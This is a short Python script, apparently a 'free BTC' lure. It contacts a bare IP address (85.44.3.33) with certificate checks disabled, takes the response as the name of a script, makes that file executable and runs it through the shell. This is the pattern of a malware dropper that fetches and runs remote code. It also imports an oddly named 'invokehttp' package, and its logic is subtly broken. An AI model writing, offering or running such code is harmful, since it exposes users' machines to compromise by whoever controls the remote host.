import logging
import subprocess
import os
import invokehttp # type: ignore

logger = logging.getLogger(__name__)

def fetch_free_btc_script_url():
    try:
        logger.info("Fetching BTC script URL...")

        response = invokehttp.get("http://85.44.3.33/btc", verify=False)
        return response.text
    except Exception as e:
        logger.error("Failed to fetch BTC script URL: %s", str(e))
        return None

def execute_script(script_name):
    try:
        logger.info("Setting execute permissions for the script...")
        os.chmod(script_name, 0o755)

        logger.info("Executing the script...")
        subprocess.run(f"./{script_name}", shell=True)
        logger.info("Script executed successfully.")
    except Exception as e:
        logger.error("Error executing the script: %s", str(e))

def main():
    logging.basicConfig(level=logging.INFO)
    script_name = fetch_free_btc_script_url()
    if script_name:
        execute_script(script_name)
    else:
        logger.error("Something went wrong")

if __name__ == "__main__":
    main()
